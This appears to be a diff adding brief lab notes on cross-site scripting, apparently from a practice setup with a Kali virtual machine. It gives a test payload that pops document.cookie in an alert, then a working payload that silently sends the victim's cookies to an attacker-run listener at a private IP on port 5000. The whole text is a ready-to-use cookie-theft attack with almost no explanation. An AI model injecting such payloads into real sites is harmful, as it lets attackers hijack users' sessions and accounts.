@@ -1,0 +1,5 @@
+we can prompt an <alert> to test for cookies first use the js code below
+<img src=x onerror="alert(document.cookie)">
+
+else you can just skip to injecting it and xfer to kali vm ip:5000
+<img src=x onerror="new Image().src='http://10.0.2.15:5000/steal?cookie='+document.cookie;">
